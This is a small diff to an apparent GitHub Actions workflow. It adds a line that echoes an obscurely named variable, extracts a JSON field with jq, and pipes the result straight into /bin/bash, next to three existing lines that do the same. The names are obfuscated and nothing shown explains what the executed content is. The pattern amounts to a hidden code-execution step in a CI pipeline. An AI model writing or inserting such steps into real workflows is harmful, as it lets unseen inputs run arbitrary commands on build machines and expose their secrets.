@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$b90078" | jq -r .ele2 | /bin/bash
           printf '%s' "$syino2" | jq -r .uawll50 | /bin/bash
           printf '%s' "$u762" | jq -r .r1 | /bin/bash
+          echo $ps35225 | jq -r .yql44600 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
